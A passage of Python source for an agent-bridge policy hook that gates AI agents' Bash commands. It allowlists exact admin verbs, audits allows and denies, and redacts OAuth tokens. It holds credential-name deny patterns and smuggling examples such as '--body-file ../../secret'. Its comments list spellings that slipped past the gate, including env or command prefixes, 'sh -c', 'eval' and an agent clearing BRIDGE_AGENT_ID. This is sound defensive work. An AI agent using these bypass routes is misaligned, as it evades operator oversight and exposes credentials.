            leaf = toks[i].rsplit("/", 1)[-1]
            # direct-script spelling: `[python3] bridge-config.py set-env`
            if leaf == "bridge-config.py" and toks[i + 1] == "set-env":
                return True
            # canonical-wrapper triple: `(agb|agent-bridge) config set-env`
            if (i + 2 < len(toks)
                    and leaf in {"agent-bridge", "agb"}
                    and toks[i + 1] == "config"
                    and toks[i + 2] == "set-env"):
                return True
    return False


def _config_set_env_check(
    text: str,
    agent: str,
    tool_input: dict[str, Any] | None,
) -> tuple[bool, str | None]:
    """Exact-shape, admin-only gate for `(agent-bridge|agb) config set-env`.

    Returns ``(allowed, deny_reason)`` like ``_admin_bridge_verb_check``:
    - ``(True, None)``  — sanctioned admin invocation; audit row emitted.
    - ``(False, str)``  — recognized as a `config set-env` attempt but
      rejected (env-assignment spoof, shell embedding/redirect/separator,
      non-admin caller). The caller returns the deny reason so a spoof /
      smuggle cannot fall through to a silent allow at the peer/shared gate.
    - ``(False, None)`` — not a `config set-env` invocation at all; the
      caller falls through to the normal gates.

    NOTE: the path-argv detection used elsewhere is deliberately NOT relied
    on here — `set-env` names no protected path. The wrapper layers its own
    admin/source gate + before/after-hash audit; the hook's job is the
    exact-shape + anti-spoof envelope so a malformed/spoofed/smuggling call is
    denied at the hook and never even reaches the wrapper.
    """
    # RECOGNITION: is the first command stage a `config set-env` invocation?
    # If not, this is not our verb — fall through unchanged. From here on,
    # EVERY exit is an explicit allow/deny (never a silent fall-through), so a
    # recognized attempt cannot leak to the peer/shared gate.
    if not _config_set_env_attempt_present(text):
        return False, None

    # TEETH 1 — leading `VAR=value` env-assignment prefix is a spoof of the
    # wrapper's trust env (`BRIDGE_CALLER_SOURCE` / `BRIDGE_AGENT_ID`). Deny.
    if _has_leading_env_assignment(text):
        _emit_config_set_env_denied_audit(
            agent,
            text=text,
            tool_input=tool_input,
            reason="env_assignment_prefix_spoof",
        )
        return False, (
            "agent-bridge config set-env: a leading VAR=value env-assignment "
            "prefix is not allowed (anti-spoof of BRIDGE_CALLER_SOURCE / "
            "BRIDGE_AGENT_ID)"
        )

    # (The `env`/`exec`/`nice`/… prefix and `time`/`!`/`(`/`{` keyword forms are
    # not enumerated here — they are RECOGNIZED above and DENIED uniformly by the
    # canonical-shape gate below, which requires the bare agb verb as token[0].)

    # TEETH 2 — shell embeddings / redirections / separators. The wrapper
    # cannot guard a file the shell opens or a second piped command that runs
    # before it. A recognized set-env attempt carrying any of these is DENIED
    # (not allowed, and not fallen-through).
    if _command_has_shell_embedding(text):
        _emit_config_set_env_denied_audit(
            agent, text=text, tool_input=tool_input, reason="shell_embedding"
        )
        return False, (
            "agent-bridge config set-env: shell embeddings "
            "($(...), backticks, <(...), heredoc) are not allowed"
        )
    sanitized = _SAFE_REDIRECT_RE.sub(" ", text)
    if "<" in sanitized or ">" in sanitized:
        _emit_config_set_env_denied_audit(
            agent, text=text, tool_input=tool_input, reason="io_redirection"
        )
        return False, (
            "agent-bridge config set-env: I/O redirection is not allowed"
        )
    if _COMMAND_OPERATOR_RE.search(sanitized):
        _emit_config_set_env_denied_audit(
            agent, text=text, tool_input=tool_input, reason="command_separator"
        )
        return False, (
            "agent-bridge config set-env: command separators "
            "(;, |, &, &&, ||) are not allowed"
        )

    # SHAPE — strict positional `(agb|agent-bridge) config set-env <KEY=VALUE>`.
    try:
        tokens = shlex.split(sanitized, posix=True, comments=False)
    except ValueError:
        _emit_config_set_env_denied_audit(
            agent, text=text, tool_input=tool_input, reason="unparseable"
        )
        return False, "agent-bridge config set-env: unparseable command"
    # CANONICAL shape — for a RECOGNIZED set-env attempt, the ONLY allowed form
    # is a single stand-alone stage whose FIRST token is the bare agb verb
    # (TEETH 1/2 above already removed a leading bare VAR=, separators,
    # embeddings and redirects). Anything else still standing — a shell keyword
    # (`time`, `!`), a grouping metacharacter (`(`, `{`), or an
    # `env`/`exec`/`nice`/… prefix (incl. `env -i` / `env --`) before the verb —
    # is a recognized-but-non-canonical attempt and is DENIED here. It
    # previously fell through to a SILENT ALLOW; set-env has NO protected-path
    # argv backstop, so this gate is the sole boundary. Allowlist the good
    # shape, do not enumerate the bad (codex r2 #11717 / patch r3 #11718).
    if (len(tokens) < 3
            or tokens[0].rsplit("/", 1)[-1] not in {"agent-bridge", "agb"}
            or tokens[1] != "config"
            or tokens[2] != "set-env"):
        _emit_config_set_env_denied_audit(
            agent, text=text, tool_input=tool_input, reason="non_canonical_shape"
        )
        return False, (
            "agent-bridge config set-env: only the exact "
            "`(agb|agent-bridge) config set-env KEY=VALUE` form is allowed — no "
            "leading prefix command, shell keyword, grouping, or env wrapper"
        )

    # Recognized as a `config set-env` invocation. Admin-only at the hook
    # layer (the wrapper re-checks; defense-in-depth). A non-admin attempt is
    # denied explicitly + audited.
    if not is_admin_agent(agent):
        _emit_config_set_env_denied_audit(
            agent,
            text=text,
            tool_input=tool_input,
            reason="non_admin_caller",
        )
        return False, (
            "agent-bridge config set-env is admin-only; non-admin agents "
            "must request env overrides through admin"
        )
    _emit_config_set_env_allowed_audit(agent, text=text, tool_input=tool_input)
    return True, None


def _emit_config_set_env_allowed_audit(
    agent: str,
    *,
    text: str,
    tool_input: dict[str, Any] | None,
) -> None:
    """Audit row for a sanctioned admin `config set-env` invocation.

    Mirrors `_emit_admin_bridge_verb_audit`. The wrapper emits its own
    before/after-hash `system_config_mutation` row on apply; this row records
    the HOOK's allow decision so the operator can see the gate let the
    command through (and correlate with the wrapper row by timestamp).
    """
    detail: dict[str, Any] = {
        "tool": "Bash",
        "verb": "config set-env",
        "sample": _redact_credential_token_values(truncate_text(text, 240)),
    }
    if tool_input is not None:
        detail["summary"] = _redact_credential_summary(
            tool_input_summary("Bash", tool_input)
        )
    write_audit(
        "tool_policy_config_set_env_allowed",
        agent or "unknown",
        detail,
    )


def _emit_config_set_env_denied_audit(
    agent: str,
    *,
    text: str,
    tool_input: dict[str, Any] | None,
    reason: str,
) -> None:
    """Audit row for a denied `config set-env` attempt (spoof / non-admin).

    Mirrors `_emit_admin_bridge_verb_denied_shape_audit`. `reason` records
    the specific deny (`env_assignment_prefix_spoof` / `non_admin_caller`) so
    operators can grep smuggling attempts and the smoke can pin the shape.
    """
    detail: dict[str, Any] = {
        "tool": "Bash",
        "verb": "config set-env",
        "reason": reason,
        "sample": _redact_credential_token_values(truncate_text(text, 240)),
    }
    if tool_input is not None:
        detail["summary"] = _redact_credential_summary(
            tool_input_summary("Bash", tool_input)
        )
    write_audit(
        "tool_policy_config_set_env_denied",
        agent or "unknown",
        detail,
    )


# Issue #6607 — anchored admin bridge-verb allowlist.
#
# Codex r1 rejected the original "full admin bypass" / "per-agent
# settings-disable" proposals as broad command-injection bypasses.
# Prescription (verbatim): "Add an anchored bridge-verb allowlist with
# audit. Keep raw credential/env dump denies and protected secret-path
# denies FIRST. Then allow audited admin bridge verbs for **exact
# command shapes**." NOT regex `.*`.
#
# Three verb shapes:
#   - `(agent-bridge|agb) auth claude-token (add|activate|sync|rotate) [args]`
#     — admin-only (token mutation is operator-deputy work).
#   - `(agent-bridge|agb) escalate question [args]`
#     — both roles (non-admin needs this to surface blockers to admin).
#   - `(agent-bridge|agb) a2a send [--body-file <safe-path>] [args]`
#     — both roles. If `--body-file` is given, the value must be a safe
#       path (no traversal, no shell metacharacters); inline `--body`
#       text bodies are accepted as-is because the credential/env gates
#       above already screen secret-bearing text.
#
# Defense shape (mirrors `_is_config_set_wrapper`):
#   - No shell embeddings (`$(...)`, backticks, `<(...)`, `>(...)`, `<<`)
#   - No I/O redirection beyond the safe stderr-discard forms
#   - No multi-command separators (`;`, `&&`, `||`, `|`, `&`, newline)
#   - shlex tokens[0] leaf is `agent-bridge` or `agb` (path prefix tolerated)
#   - Subcommand at strict positional `tokens[1]` / `tokens[2]` / `tokens[3]`
#
# When the verb shape matches but the args are unsafe OR the caller's
# role does not permit the verb, the helper returns a deny reason so
# the gate produces an explicit deny rather than silently falling
# through to the peer/shared check (where `--body-file ../../secret`
# would otherwise slip past).
_SAFE_SLUG_RE = re.compile(r"^[A-Za-z0-9._-]+$")
_PATH_METACHAR_CHARS = frozenset("$`;|&<>*?")


def _safe_path_arg(value: str) -> bool:
    """True iff *value* is safe to accept as a file-path argument to a
    bridge verb.

    Safe means:
    - non-empty
    - no `..` path component anywhere (rejects path traversal lexically;
      we do NOT call `os.path.normpath` first because the literal
      traversal is itself the signal to reject)
    - no embedded shell metacharacter — defense-in-depth in case a
      quoted token survived shlex with metacharacters intact
    - no NUL byte (defense-in-depth; the OS would reject it anyway, but
      we want a clean deny shape)
    """
    if not value:
        return False
    if "\0" in value:
        return False
    # Normalize the separator and split into components for the `..` check.
    parts = value.replace("\\", "/").split("/")
    if any(part == ".." for part in parts):
        return False
    if any(ch in _PATH_METACHAR_CHARS for ch in value):
        return False
    return True


def _safe_slug_arg(value: str) -> bool:
    """True iff *value* is a safe identifier-ish argument (token id, csv key).

    Permits `[A-Za-z0-9._-]+` only — the same alphabet `bridge-auth.sh`
    accepts for token ids. Rejects shell metacharacters, whitespace,
    and path separators.
    """
    if not value:
        return False
    return bool(_SAFE_SLUG_RE.match(value))


# Distinct sentinels for `_extract_flag_value` outcomes. The earlier
# implementation collapsed "absent" and "malformed" into a single `None`
# return — codex r1 (PR #1243) flagged this as a security regression
# because the a2a-send allowlist treated "no --body-file arg" and "
# --body-file at end of argv" identically (both allowed). Three malformed
# shapes slipped through:
#   - `agb a2a send --body-file`                 (flag, no value)
#   - `agb a2a send --body-file --to peer`       (next token is another flag)
#   - `agb a2a send --body-file /tmp/x --body-file ../../secret` (duplicate)
# We now distinguish absent (allowed) from malformed/duplicate (denied)
# with two singleton sentinels. Callers in the bridge-verb allowlist
# branch on identity, NOT on `is None`, so a future refactor that
# accidentally returns `None` is caught by a type/identity mismatch in
# review rather than silently re-opening the bypass.
class _FlagSentinel:
    __slots__ = ("_label",)

    def __init__(self, label: str) -> None:
        self._label = label

    def __repr__(self) -> str:  # pragma: no cover - debugging aid
        return f"<{self._label}>"


_FLAG_ABSENT = _FlagSentinel("FLAG_ABSENT")
_FLAG_MALFORMED = _FlagSentinel("FLAG_MALFORMED")


def _extract_flag_value(
    tokens: list[str], flag: str
) -> "str | _FlagSentinel":
    """Return the value of `--flag <value>` / `--flag=value` in *tokens*.

    Three distinct outcomes:
    - `_FLAG_ABSENT`: flag not present at all. Caller may allow the
      command (the flag is optional in the verb shape).
    - `_FLAG_MALFORMED`: flag present but its value is missing or
      smuggled — codex r1 cases. Specifically:
        * `--flag` at end of argv (no following token);
        * `--flag` followed by another `--flag-like` token (the next
          token starts with `-` and is not a bare `-` stdin marker);
        * the flag appears more than once (separated or packed), even
          if every individual occurrence carries a value. Duplicates
          are treated as a smuggling attempt (last-wins semantics would
          let `--body-file /tmp/ok --body-file ../../secret` slip the
          first occurrence past the allowlist).
      Caller MUST deny these.
    - `str`: flag present exactly once with a non-flag value. Caller
      validates the string with `_safe_path_arg` / `_safe_slug_arg` /
      similar before allowing.
    """
    found: str | None = None
    seen = 0
    idx = 0
    n = len(tokens)
    prefix = flag + "="
    while idx < n:
        tok = tokens[idx]
        if tok == flag:
            seen += 1
            if seen > 1:
                return _FLAG_MALFORMED
            if idx + 1 >= n:
                return _FLAG_MALFORMED
            nxt = tokens[idx + 1]
            # A following token that looks like another flag (starts
            # with `-` and is more than a single dash) is treated as a
            # missing value — `agb a2a send --body-file --to peer`.
            if nxt.startswith("-") and nxt != "-":
                return _FLAG_MALFORMED
            found = nxt
            idx += 2
            continue
        if tok.startswith(prefix):
            seen += 1
            if seen > 1:
                return _FLAG_MALFORMED
            # `--flag=` (empty value) is malformed; `_safe_path_arg`
            # would reject an empty string anyway, but the caller
            # contract wants a clear deny shape.
            value = tok[len(prefix):]
            if value == "":
                return _FLAG_MALFORMED
            found = value
        idx += 1
    if seen == 0:
        return _FLAG_ABSENT
    # seen == 1 and we captured a non-flag, non-empty value above.
    assert found is not None
    return found


def _emit_admin_bridge_verb_audit(
    agent: str,
    *,
    text: str,
    tool_input: dict[str, Any] | None,
    verb_path: tuple[str, ...],
) -> None:
    """Audit row for an admin bridge-verb allowlist bypass.

    Mirrors the deny-row `summary` field so a single audit consumer can
    read allow + deny rows uniformly. `verb_path` is the matched verb
    chain (e.g. `("auth", "claude-token", "add")`) for direct filtering.
    """
    # Codex r3 BLOCKING (r4, 2026-05-29, #1358) — class closure. The
    # `auth claude-token add` verb path is the SAME credential routine
    # surfaced through `agb`/`agent-bridge` (vs `bash bridge-auth.sh`). In
    # the CURRENT gate order this writer is only reached for token-FREE
    # commands — `_raw_mentions_claude_credentials` denies any text with an
    # `sk-ant-o…` run before `_admin_bridge_verb_check` runs — so the
    # redaction below is defense-in-depth, not a live leak fix. It is kept
    # so a future gate reorder or a new verb that legitimately carries a
    # token-shaped argv value cannot turn this `_allowed` row into a leak.
    # Redact token-shaped VALUES out of `sample` and the `summary` block
    # (value-only — keeps the verb chain + flag skeleton as the forensic
    # anchor). The `write_audit` choke-point is the SSOT belt-and-suspenders.
    detail: dict[str, Any] = {
        "tool": "Bash",
        "verb": " ".join(verb_path),
        "sample": _redact_credential_token_values(truncate_text(text, 240)),
    }
    if tool_input is not None:
        detail["summary"] = _redact_credential_summary(
            tool_input_summary("Bash", tool_input)
        )
    else:
        detail["summary"] = {
            "command": _redact_credential_token_values(truncate_text(text, 240)),
            "description": "",
        }
    write_audit(
        "tool_policy_admin_bridge_verb_allowed",
        agent or "unknown",
        detail,
    )


def _emit_admin_bridge_verb_denied_shape_audit(
    agent: str,
    *,
    text: str,
    tool_input: dict[str, Any] | None,
    verb_path: tuple[str, ...],
    reason: str,
) -> None:
    """Audit row for an admin bridge-verb shape-deny (codex r1 PR #1243).

    Mirrors `_emit_admin_bridge_verb_audit` so a single audit consumer
    can grep both allow + deny shape rows uniformly. The `reason` field
    records the specific malformed-shape failure (missing value,
    duplicate flag, etc.) so operators can triage smuggling attempts.
    """
    # Codex r3 BLOCKING (r4, 2026-05-29, #1358) — class closure. Like
    # `_emit_admin_bridge_verb_audit`, this shape-deny writer is only
    # reached for token-free text in the current gate order (the
    # credential substring deny fires first). Redaction here is therefore
    # defense-in-depth against a future gate reorder / new verb. Redact
    # token-shaped VALUES out of `sample` and `summary` (value-only —
    # keeps the verb chain + deny `reason` as the forensic anchor). The
    # `write_audit` choke-point is the SSOT belt-and-suspenders.
    detail: dict[str, Any] = {
        "tool": "Bash",
        "verb": " ".join(verb_path),
        "reason": reason,
        "sample": _redact_credential_token_values(truncate_text(text, 240)),
    }
    if tool_input is not None:
        detail["summary"] = _redact_credential_summary(
            tool_input_summary("Bash", tool_input)
        )
    else:
        detail["summary"] = {
            "command": _redact_credential_token_values(truncate_text(text, 240)),
            "description": "",
        }
    write_audit(
        "tool_policy_admin_bridge_verb_denied_shape",
        agent or "unknown",
        detail,
    )


# Issue #1358 — credential-routine audit emit.
#
# Codex r1 BLOCKING #1 (initial): the sanctioned shape includes optional
# here-string / heredoc body that carries the OAuth token, so writing
# the raw command text to the audit log would persist the token. The
# initial r1 fix redacted the body content but still wrote a (redacted)
# copy of the command to ``sample`` / ``summary.command``.
#
# Codex r1 BLOCKING #1 (r2, 2026-05-29): the brief required HASH-ONLY —
# no command text in any form. A redacted-but-still-text field is one
# regex miss away from leaking the token (e.g. if a future shell
# operator embeds the token in a shape the redactor does not recognise).
# The new schema therefore carries ONLY the SHA-256 of the original
# command bytes (``command_sha256``), so the audit row remains a
# forensic anchor (operators can hash the suspected command and grep
# for the hash) while carrying zero command text.
#
# Schema:
#   { "tool": "Bash",
#     "surface": "raw_credentials_mention",
#     "exemption": "credential_routine_admin",
#     "command_sha256": "<64-char lowercase hex>" }
#
# No ``sample``, no ``summary``, no ``command``, no ``description``.


def _credential_routine_command_sha256(text: str) -> str:
    """Return the SHA-256 hex digest of *text* as the audit-row anchor.

    Used by both the exemption-allowed audit row and the deny-audit
    summary scrub (codex r1 BLOCKING #1 r3, 2026-05-29) so a single
    helper guarantees both surfaces compute the same forensic anchor
    on the same input bytes. UTF-8 encoded with `errors="replace"` so
    a stray invalid byte cannot raise inside an audit-emit path.
    """
    return hashlib.sha256(
        (text or "").encode("utf-8", errors="replace")
    ).hexdigest()


# Codex r2 BLOCKING (r3, 2026-05-29, #1358) — token-VALUE redaction for
# the audit surfaces that legitimately keep raw text (admin read-intent
# allow rows and non-Bash deny / escalation summaries, where a credential
# FILE PATH is a wanted forensic anchor but a token-shaped VALUE must not
# survive). The hash-only scrub on Bash summaries handles the
# credential-routine command; these surfaces instead need surgical
# removal of the OAuth token run while preserving the surrounding path /
# pattern structure.
#
# The OAuth setup-token prefix is `sk-ant-o`; tokens continue with
# `[A-Za-z0-9_-]`. Collapse the run to the prefix + `<REDACTED>`.
# Issue #1358 r6 (codex r5 BLOCKING): idempotent — the (?!<REDACTED>)
# lookahead keeps a second redaction pass (or the Layer 1 write_audit
# choke-point re-running over this writer's output) a no-op instead of
# producing ``sk-ant-o<REDACTED><REDACTED>``.
_CREDENTIAL_TOKEN_VALUE_RE = re.compile(r"sk-ant-o(?!<REDACTED>)[A-Za-z0-9_-]*")


def _redact_credential_token_values(text: str) -> str:
    """Redact OAuth token runs (`sk-ant-o…`) from *text*, keep structure.

    Surgical, value-only redaction: replaces every `sk-ant-o…` run with
    `sk-ant-o<REDACTED>` so a credential path / pattern that merely
    NAMES the token retains its forensic shape (the path basename, the
    grep pattern skeleton) while the token bytes themselves never land
    in an audit row or queued task body. Used by the admin read-intent
    allow audit and the non-Bash deny summary, where a hash-only
    substitution would discard the wanted path anchor.
    """
    return _CREDENTIAL_TOKEN_VALUE_RE.sub("sk-ant-o<REDACTED>", text or "")


def _redact_credential_summary(summary: dict[str, Any]) -> dict[str, Any]:
    """Return *summary* with every string value token-value-redacted.

    Applied to the structured ``summary`` block of audit rows that keep
    raw (non-hash) text. Each string field is passed through
    :func:`_redact_credential_token_values`; non-string values are left
    intact. Does not mutate the input dict.
    """
    return {
        key: (
            _redact_credential_token_values(value)
            if isinstance(value, str)
            else value
        )
        for key, value in summary.items()
    }


def _credential_routine_hash_only_summary(text: str) -> dict[str, Any]:
    """Return a hash-only summary block for the deny-audit `detail.summary`.

    Codex r1 BLOCKING #1 r3 (2026-05-29): when a Bash command matches
    the sanctioned credential-routine shape but is denied downstream
    (e.g. `--token-file ~/.claude/.credentials.json` triggers the
    credential-path argv gate), the generic `agent_tool_denied` row
    would otherwise carry the raw command in `detail.summary.command`
    via :func:`tool_input_summary`. The audit log then persists the
    operator's OAuth token even though the exemption row above was
    hash-only. This summary substitutes the same `command_sha256`
    anchor; the raw command text never lands in the deny row.

    Schema mirrors the Bash branch of :func:`tool_input_summary`
    (same field name `command_sha256` instead of `command`) so audit
    consumers can detect the hash-only form. `description` is
    deliberately omitted — the Bash `description` field is operator-
    authored prose and could itself carry token contents.
    """
    return {
        "command_sha256": _credential_routine_command_sha256(text),
    }


def _emit_credential_routine_admin_exempted_audit(
    agent: str,
    *,
    text: str,
    tool_input: dict[str, Any] | None,
) -> None:
    """Audit row for admin credential-routine substring-deny bypass (#1358).

    Issue #1358: ``_raw_mentions_claude_credentials`` denies any Bash text
    containing one of the five credential substrings (``sk-ant-o``,
    ``.credentials.json`` + ``.claude``, ``CLAUDE_CODE_OAUTH_TOKEN``,
    ``launch-secrets.env``, ``claude-oauth-tokens.json``). Admin rotation
    pool registration (``bash bridge-auth.sh claude-token add --stdin``)
    needed to be unblocked when the operator pipes a fresh token through
    stdin — the command text legitimately carries ``sk-ant-o…``.

    The carve-out is narrow: strict-prefix-matched ``bash bridge-auth.sh
    claude-token add --stdin`` only, no shell embedding / multi-command /
    redirection, and admin role. Every bypass writes this audit row so
    the operator retains a defense-in-depth ledger of credential-routine
    exemptions.

    Codex r1 BLOCKING #1 (r2, 2026-05-29): the audit row carries ONLY
    the SHA-256 of the original command bytes — no ``sample``, no
    ``summary.command``, no command text in any form. The hash gives
    operators a forensic anchor (rehash the suspected command and grep
    the audit log) while guaranteeing the audit log itself never
    persists the token even if a future redactor regex would have
    missed a new shell shape. ``tool_input`` is accepted but
    deliberately not emitted; the parameter is retained for call-site
    symmetry with :func:`_emit_admin_credential_read_allowed` and so
    future schema extensions can lift forensic-safe fields from the
    raw tool input without re-threading the call chain.
    """
    raw_command = text or ""
    if tool_input is not None and not raw_command:
        # Fallback if the caller did not pre-extract text — should not
        # happen in practice (the carve-out path always passes the raw
        # text), but keep the hash anchored on the actual command.
        raw_command = str(tool_input.get("command") or "")
    detail: dict[str, Any] = {
        "tool": "Bash",
        "surface": "raw_credentials_mention",
        "exemption": "credential_routine_admin",
        "command_sha256": _credential_routine_command_sha256(raw_command),
    }
    write_audit(
        "tool_policy_credential_routine_admin_exempted",
        agent or "unknown",
        detail,
    )


# Issue #1367 — sealed-paste token-FREE request shape.
#
# The sealed-paste root path (`bridge-auth.sh claude-token receive`)
# reads the OAuth token echo-off from the OPERATOR's controlling tty, so
# a token NEVER appears in the agent's Bash command at all. The ONLY
# agent-initiated shape we exempt here is the token-FREE request/receipt
# (`receive --request … --json`), so an admin agent can INITIATE the
# flow without ever touching the token. The token-ACCEPTING `receive`
# form is deliberately NOT exempted: it has no token-bearing argv (no
# --stdin/--token-file/positional), and run from inside an agent it
# fails closed at the tty open. Keeping it out of the exemption means an
# agent Bash tool cannot drive a token-accepting receive past this gate.
#
# Both `bash bridge-auth.sh …` and `agb auth …` / `agent-bridge auth …`
# spellings are accepted (the verb is the same surface through three
# front-ends). The match is strict-prefix on the raw text (mirrors the
# #1358 contract: a quote/spacing variant must fail) then shape-validates
# the suffix flags against a tight token-free allowlist.
_SEALED_RECEIVE_REQUEST_PREFIXES = (
    "bash bridge-auth.sh claude-token receive --request",
    "agb auth claude-token receive --request",
    "agent-bridge auth claude-token receive --request",
)

# Token-free request shape flags. NOTE: NO --stdin, NO --token-file, NO
# --note (free text), NO positional — anything outside this set denies.
_SEALED_REQUEST_FLAGS_BOOL = frozenset(
    {
        "--request",
        "--activate",
        "--replace",
        "--enable-auto-rotate",
        "--json",
    }
)
_SEALED_REQUEST_FLAGS_SLUG = frozenset({"--id", "--agents", "--threshold"})


def _validate_sealed_request_args(tokens: list[str]) -> bool:
    """Walk *tokens* accepting only the token-FREE sealed-request flags.

    Rejects any positional argument, any unknown flag (so a future
    token-bearing flag cannot be absorbed), any DUPLICATE flag (a
    smuggling shape — `--id a --id b`), `--note`/`--token-file`/
    `--stdin`/`--fulfill` (not part of the request shape), and validates
    each value flag's argument as a safe slug. Fail-closed: any malformed
    shape returns False.
    """
    idx = 0
    n = len(tokens)
    seen: set[str] = set()
    while idx < n:
        tok = tokens[idx]
        if tok in _SEALED_REQUEST_FLAGS_BOOL:
            if tok in seen:
                return False
            seen.add(tok)
            idx += 1
            continue
        if tok in _SEALED_REQUEST_FLAGS_SLUG:
            if tok in seen:
                return False
            seen.add(tok)
            if idx + 1 >= n:
                return False
            if not _safe_slug_arg(tokens[idx + 1]):
                return False
            idx += 2
            continue
        if tok.startswith("--") and "=" in tok:
            flag, value = tok.split("=", 1)
            if flag in _SEALED_REQUEST_FLAGS_SLUG:
                if flag in seen:
                    return False
                seen.add(flag)
                if not _safe_slug_arg(value):
                    return False
                idx += 1
                continue
            return False
        # Positional / unknown flag — reject.
        return False
    return True


def _is_sealed_receive_request(text: str, agent: str) -> bool:
    """True iff *text* is an admin's token-FREE sealed-receive REQUEST.

    Tight exemption (#1367): admin role (strict env+roster agreement,
    same gate as the #1358 carve-out) AND the token-free request shape.
    The shape gate requires: a literal request prefix, `--json`, no
    shell embedding / command separators / redirection / substitution,
    and only the token-free flag allowlist. Returns False (NOT raising)
    on any mismatch so the exemption fails closed.

    Scoped to the ``bash bridge-auth.sh`` spelling: the ``agb`` /
    ``agent-bridge auth …`` spellings route through
    :func:`_admin_bridge_verb_check`, which emits its own sealed-paste
    audit row — gating the main-flow emit to the bash spelling avoids a
    double audit row for the same command.
    """
    if not _is_admin_credential_routine_strict_agreement(agent):
        return False
    if not text.lstrip().startswith("bash bridge-auth.sh claude-token receive --request"):
        return False
    return _sealed_receive_request_shape_matches(text)


def _sealed_receive_request_shape_matches(text: str) -> bool:
    """Shape-only gate for the token-free sealed-receive request (#1367).

    No role check — factored out so a future caller can reuse it. The
    shape is intentionally MUCH tighter than the #1358 add carve-out:
    there is no heredoc/here-string body (the request carries no token),
    so ANY `<`/`>`/`<<`/substitution/separator denies outright.
    """
    if not text:
        return False
    stripped = text.lstrip()
    matched_prefix = ""
    for prefix in _SEALED_RECEIVE_REQUEST_PREFIXES:
        if stripped.startswith(prefix):
            matched_prefix = prefix
            break
    if not matched_prefix:
        return False
    after_prefix = stripped[len(matched_prefix):]
    # The char after `--request` must end the token or be whitespace.
    if after_prefix and after_prefix[0] not in (" ", "\t"):
        return False
    # No shell embedding (heredoc/here-string/proc-sub) — the request
    # shape never needs any of them.
    if _command_has_shell_embedding(text):
        return False
    if re.search(r"\$\(", text) or "`" in text:
        return False
    # No command separators or redirection anywhere (after dropping the
    # safe `2>/dev/null` forms). The request shape is a single command.
    sanitized = _SAFE_REDIRECT_RE.sub(" ", text)
    if _COMMAND_OPERATOR_RE.search(sanitized):
        return False
    if "<" in sanitized or ">" in sanitized:
        return False
    # Validate the suffix flags against the token-free allowlist.
    try:
        tokens = shlex.split(after_prefix, posix=True, comments=False)
    except ValueError:
        return False
    if not _validate_sealed_request_args(tokens):
        return False
    # Must carry --json (the request/receipt is a structured emit) and
    # must NOT carry the token-accepting flags.
    if "--json" not in tokens:
        return False
    for forbidden in ("--stdin", "--token-file", "--note", "--fulfill"):
        if forbidden in after_prefix:
            return False
    return True


# Deny reason for a `bash bridge-auth.sh claude-token receive` invocation
# that is NOT the token-free `--request … --json` request shape. The
# token-ACCEPTING receive reads the OAuth token echo-off from the
# operator's controlling tty; it must be run by the operator from a
# terminal, never driven from an agent Bash tool. The `agb` /
# `agent-bridge` spellings are already denied by
# `_admin_bridge_verb_check`; this guards the `bash bridge-auth.sh`
# wrapper spelling so it cannot fall through the bash-wrapper path.
SEALED_RECEIVE_BASH_DENY_REASON = (
    "bash bridge-auth.sh claude-token receive: only the token-free "
    "`--request ... --json` shape is permitted from an agent; the "
    "token-accepting receive reads the token echo-off from the operator's "
    "terminal and must be run by the operator, not from an agent Bash tool"
)


_ENV_ASSIGN_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")


def _is_bash_wrapper_receive(text: str) -> bool:
    """True iff *text* invokes `bash <…>/bridge-auth.sh claude-token receive …`.

    Spelling-scoped detector for the bash wrapper (`agb` / `agent-bridge`
    spellings route through `_admin_bridge_verb_check`). shlex-splits the
    command and matches the `bash <path>bridge-auth.sh claude-token receive`
    sub-verb robustly, so it is NOT fooled by the variants a prefix-only
    `startswith` missed (codex #1367 r2): an absolute/relative path to
    bridge-auth.sh (`bash /opt/x/bridge-auth.sh …`), collapsed/extra
    whitespace (`bash  bridge-auth.sh …`), or a leading `VAR=value`
    env-assignment prefix (`FOO=1 bash bridge-auth.sh …`). Returns False
    (never raises) on any non-matching shape; on an unsplittable string
    that still names the wrapper receive, denies (returns True) rather than
    falling through.
    """
    stripped = text.lstrip() if text else ""
    # Cheap pre-filter before the shlex cost; the tokenized sub-verb match
    # below is the real (path/spacing/env-prefix robust) check.
    if "bridge-auth.sh" not in stripped or "claude-token" not in stripped:
        return False
    try:
        tokens = shlex.split(stripped, posix=True, comments=False)
    except ValueError:
        # Unbalanced quotes etc. (a smuggling attempt) but the command
        # still names the wrapper receive — deny rather than fall through.
        return "receive" in stripped
    # See through leading `VAR=value` env-assignments AND `env`/`command`
    # /`/usr/bin/env` command-prefix wrappers (with their own flags +
    # `env`'s VAR=value / `-u NAME` args), then bash options — codex #1367
    # r4 found `env FOO=1 bash …`, `/usr/bin/env bash …`, `command bash …`,
    # `bash --noprofile …` all ran a working token-accepting receive. NOTE
    # this hook detector is BEST-EFFORT defense-in-depth ONLY and NOT
    # exhaustive: unbounded spellings (`sh -c "…"`, `eval`, a symlink, or
    # invoking `python3 bridge-auth.py receive` directly) escape it, and the
    # bridge-auth.py runtime agent-context refusal it pairs with is ALSO
    # best-effort (an agent on a shared-UID host can clear BRIDGE_AGENT_ID +
    # attach a pty — codex #1367 r4). Neither layer is a sandbox (CLAUDE.md).
    # #1367's actual guarantee is that the OPERATOR's token, read echo-off in
    # the operator's own terminal, never transits an agent transcript; an
    # agent that bypasses both layers can only store ITS OWN token, outside
    # that threat model. We deny the common spellings here for a clean early
    # signal + audit.
    idx = 0
    while idx < len(tokens):
        tok = tokens[idx]
        if _ENV_ASSIGN_RE.match(tok):
            idx += 1
            continue
        base = tok.rsplit("/", 1)[-1]
        if base in ("env", "command", "nice", "nohup", "stdbuf"):
            idx += 1
            # Consume the wrapper's own flags + `env` VAR=value / `-u NAME`.
            while idx < len(tokens):
                a = tokens[idx]
                if _ENV_ASSIGN_RE.match(a):
                    idx += 1
                    continue
                if a.startswith("-"):
                    consumes_arg = a == "-u"
                    idx += 1
                    if consumes_arg and idx < len(tokens):
                        idx += 1
                    continue
                break
            continue
        break
    # tokens[idx] must now be the bash interpreter.
    if idx >= len(tokens) or tokens[idx].rsplit("/", 1)[-1] != "bash":
        return False
    idx += 1
    # Skip bash options (`--noprofile`, `--norc`, `-x`, …) up to the script
    # path. `-c` is intentionally NOT skipped: `bash -c '<string>'` runs a
    # code string, not `bridge-auth.sh` as argv[1] — that form is outside
    # this detector, covered only by the documented best-effort runtime
    # check + the residual-threat-model scoping (not an airtight boundary).
    while idx < len(tokens) and tokens[idx].startswith("-") and tokens[idx] != "-c":
        idx += 1
    return (
        len(tokens) - idx >= 3
        and tokens[idx].rsplit("/", 1)[-1] == "bridge-auth.sh"
